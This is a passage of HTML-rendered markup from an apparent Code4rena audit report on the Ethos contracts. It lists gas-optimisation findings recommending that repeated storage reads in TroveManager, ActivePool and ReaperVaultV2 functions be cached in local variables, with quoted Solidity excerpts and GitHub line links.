class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1127</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> ( </span><span class=\"mtk12\">rewardPerUnitStaked</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">Status</span><span class=\"mtk1\">.</span><span class=\"mtk12\">active</span><span class=\"mtk1\">) { </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; } </span><span class=\"mtk3\">//@audit: Initial access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1129</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stake</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">stake</span><span class=\"mtk1\">;</span><span class=\"mtk3\">//@audit: 2nd access</span></span></span></code></pre>\n<h3 id=\"trovemanagersolgetpendinglusddebtreward-troves_borrower_collateral-should-be-cached-in-local-storage\" style=\"position:relative;\"><a href=\"#trovemanagersolgetpendinglusddebtreward-troves_borrower_collateral-should-be-cached-in-local-storage\" aria-label=\"trovemanagersolgetpendinglusddebtreward troves_borrower_collateral should be cached in local storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TroveManager.sol.getPendingLUSDDebtReward(): Troves[_borrower][_collateral] should be cached in local storage</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1138-L1150\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1138-L1150</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"128\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1138</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getPendingLUSDDebtReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1142</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> ( </span><span class=\"mtk12\">rewardPerUnitStaked</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">Status</span><span class=\"mtk1\">.</span><span class=\"mtk12\">active</span><span class=\"mtk1\">) { </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; }</span><span class=\"mtk3\">//@audit: Initial access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1144</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stake</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">stake</span><span class=\"mtk1\">;</span><span class=\"mtk3\">//@audit: 2nd access</span></span></span></code></pre>\n<h3 id=\"trovemanagersolgetentiredebtandcoll-troves_borrower_collateral-should-be-cached-in-local-storage\" style=\"position:relative;\"><a href=\"#trovemanagersolgetentiredebtandcoll-troves_borrower_collateral-should-be-cached-in-local-storage\" aria-label=\"trovemanagersolgetentiredebtandcoll troves_borrower_collateral should be cached in local storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TroveManager.sol.getEntireDebtAndColl(): Troves[_borrower][_collateral] should be cached in local storage</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1164-L1181\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1164-L1181</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"129\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1164</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getEntireDebtAndColl</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">1173:        </span><span class=\"mtk10\">debt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">debt</span><span class=\"mtk1\">;</span><span class=\"mtk3\">//@audit: initial access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">1174:       </span><span class=\"mtk10\">coll</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">coll</span><span class=\"mtk1\">;</span><span class=\"mtk3\">//@audit: 2nd access</span></span></span></code></pre>\n<h3 id=\"trovemanagersol_removestake-troves_borrower_collateral-should-be-cached-in-local-storage\" style=\"position:relative;\"><a href=\"#trovemanagersol_removestake-troves_borrower_collateral-should-be-cached-in-local-storage\" aria-label=\"trovemanagersol_removestake troves_borrower_collateral should be cached in local storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TroveManager.sol._removeStake(): Troves[_borrower][_collateral] should be cached in local storage</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1189-L1193\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1189-L1193</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"130\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1189</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_removeStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1190</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stake</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">stake</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1191</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stake</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1192</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">stake</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1193</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h3 id=\"cache-troves_borrower_collateral-and-totalstakes_collateral-in-local-storage\" style=\"position:relative;\"><a href=\"#cache-troves_borrower_collateral-and-totalstakes_collateral-in-local-storage\" aria-label=\"cache troves_borrower_collateral and totalstakes_collateral in local storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache Troves[_borrower][_collateral] and totalStakes[_collateral] in local storage</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1201-L1210\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1201-L1210</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"131\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1201</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_updateStakeAndTotalStakes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1202</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newStake</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_computeNewStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">coll</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1203</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oldStake</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">stake</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1204</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">stake</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newStake</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1206</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oldStake</span><span class=\"mtk1\">).</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newStake</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1207</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TotalStakesUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">]);</span></span></span></code></pre>\n<h3 id=\"activepoolsolsendcollateral-collamount_collateral-should-be-cached-in-local-storage\" style=\"position:relative;\"><a href=\"#activepoolsolsendcollateral-collamount_collateral-should-be-cached-in-local-storage\" aria-label=\"activepoolsolsendcollateral collamount_collateral should be cached in local storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ActivePool.sol.sendCollateral(): collAmount[_collateral] should be cached in local storage</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L171-L188\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L171-L188</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"132\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ActivePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">171</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sendCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">175</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">collAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">collAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">176</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ActivePoolCollateralBalanceUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">]);</span></span></span></code></pre>\n<h3 id=\"activepoolsolincreaselusddebt-lusddebt_collateral-should-be-cached-in-local-storage\" style=\"position:relative;\"><a href=\"#activepoolsolincreaselusddebt-lusddebt_collateral-should-be-cached-in-local-storage\" aria-label=\"activepoolsolincreaselusddebt lusddebt_collateral should be cached in local storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ActivePool.sol.increaseLUSDDebt(): LUSDDebt[_collateral] should be cached in local storage</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L190-L195\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L190-L195</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"133\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ActivePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">increaseLUSDDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">193</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">LUSDDebt</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">LUSDDebt</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">ActivePoolLUSDDebtUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">LUSDDebt</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">195</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L197-L202\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L197-L202</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L204-L212\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L204-L212</a></p>\n<h3 id=\"reapervaultv2solavailablecapital-strategiesstrataddr-should-be-cached-in-local-storage\" style=\"position:relative;\"><a href=\"#reapervaultv2solavailablecapital-strategiesstrataddr-should-be-cached-in-local-storage\" aria-label=\"reapervaultv2solavailablecapital strategiesstrataddr should be cached in local storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ReaperVaultV2.sol.availableCapital(): strategies[stratAddr] should be cached in local storage</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L225-L252\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L225-L252</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"134\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span 